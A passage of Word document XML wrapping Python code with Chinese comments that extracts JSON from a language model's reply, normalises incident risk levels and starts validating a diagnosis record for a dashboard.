          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        lines += [f"- {e}" for e in self.evidence] or ["- （无）"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75F1F5D2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        lines += ["", f"### {SECTIONS['actions']}"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E0569FA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        lines += [f"{i}. {a}" for i, a in enumerate(self.actions, 1)] or ["1. （无）"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="192618F5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        lines += ["", f"### {SECTIONS['principle']}", self.principle]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248BFC64">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return "\n".join(lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="584BC7E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22A11964">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="21787B0B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def _extract_json(text: str) -&gt; dict:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A277E8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """模型经常把 JSON 包在 ```json 代码块里，或者前后带一句客套话。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D0BCE7F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    text = text.strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DABFAEC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fenced = re.search(r"```(?:json)?\s*(.*?)```", text, re.S)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25F9EC55">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if fenced:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F6C5609">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        text = fenced.group(1).strip()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C87514B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60AB4DC2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return json.loads(text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="302F32FC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    except json.JSONDecodeError:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A9E7CDE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F2D34BC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    start, end = text.find("{"), text.rfind("}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30CF5E80">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if start &gt;= 0 and end &gt; start:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="415AA9E4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return json.loads(text[start : end + 1])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="541BC0ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    raise ValueError(f"模型输出里找不到 JSON：{text[:200]}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2333B80D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="383903B6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DBBED09">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def parse_diagnosis(text: str, category: str = "", confidence: float = 0.0) -&gt; Diagnosis:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236085B6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    data = _extract_json(text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32BAC59B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    risk = str(data.get("risk", "medium")).strip().lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C3B0981">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if risk not in RISK_LEVELS:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3295A1E6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 模型写"中高危"之类不在枚举里的值：归到最接近的档，别让看板拿不到颜色</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39E5F220">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        risk = _closest_risk(risk)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C0AAFF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return Diagnosis(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17602118">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        summary=str(data.get("summary", "")).strip(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2057BD28">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        risk=risk,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E0C1E35">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        evidence=[str(x) for x in (data.get("evidence") or [])],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FDD2C1C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        actions=[str(x) for x in (data.get("actions") or [])],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CA88B18">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        principle=str(data.get("principle", "")).strip(),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B63EF5A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        category=category,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52BB58E9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        confidence=float(confidence),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF55247">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF1916A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="31F873A0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7949B368">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def _closest_risk(text: str) -&gt; str:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27FEE9BF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69A22BAF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        (("严重", "紧急", "critical", "severe"), "critical"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2610CE26">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        (("高", "high"), "high"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54CD3C79">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        (("中", "medium", "moderate"), "medium"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="004B82AE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        (("低", "low"), "low"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66AF9C43">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        (("提示", "info", "informational"), "info"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F7DD3CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D1DC252">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for keys, level in table:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63702BBF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if any(k in text for k in keys):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F650A67">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            return level</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2200EDCB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return "medium"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2362C0C9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="379BF940">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A9AE8A2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def validate(d: Diagnosis) -&gt; list:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72ADC667">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """返回问题清单，空列表表示合格。看板在渲染前调用它。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC03073">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    problems = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20EB2528">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if not d.summary:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BEC895E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        problems.append("缺少事件概述")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58E0AAF7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if d.risk not in RISK_LEVELS:</w:t>
      </w:r>
    </w:p>
